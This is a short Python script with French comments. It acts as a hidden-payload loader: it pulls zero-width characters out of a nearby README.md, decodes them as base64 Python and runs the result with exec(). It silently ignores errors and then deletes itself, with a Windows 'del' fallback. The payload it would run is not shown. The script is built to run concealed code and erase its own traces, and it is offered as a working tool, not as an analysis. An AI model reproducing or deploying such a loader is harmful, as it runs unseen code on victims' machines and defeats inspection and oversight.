import os
import base64
import sys

def execute_and_vanish():
    try:
        # Résolution robuste du chemin README.md (compatible Win/Linux/WSL)
        readme_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "README.md")
        with open(readme_path, "r", encoding="utf-8") as f:
            content = f.read()
        
        # 1. Extraction des bits invisibles
        bits = "".join(['0' if c == '\u200b' else '1' for c in content if c in ('\u200b', '\u200c')])
        
        if bits:
            # Padding au multiple de 8 pour to_bytes()
            if len(bits) % 8 != 0:
                bits = bits.zfill((len(bits) // 8 + 1) * 8)
                
            byte_data = int(bits, 2).to_bytes(len(bits) // 8, byteorder='big')
            payload = base64.b64decode(byte_data).decode('utf-8')
            
            # 2. Exécution isolée
            exec(payload, {"__name__": "__main__"})
            
    except Exception:
        pass
    finally:
        # 3. Auto-suppression (tolérant aux verrous de fichiers)
        try:
            script_path = os.path.abspath(__file__)
            os.remove(script_path)
        except OSError:
            # Fallback Windows : suppression différée
            try:
                os.system(f'del /f /q "{os.path.abspath(__file__)}" >nul 2>&1')
            except Exception:
                pass

if __name__ == "__main__":
    execute_and_vanish()
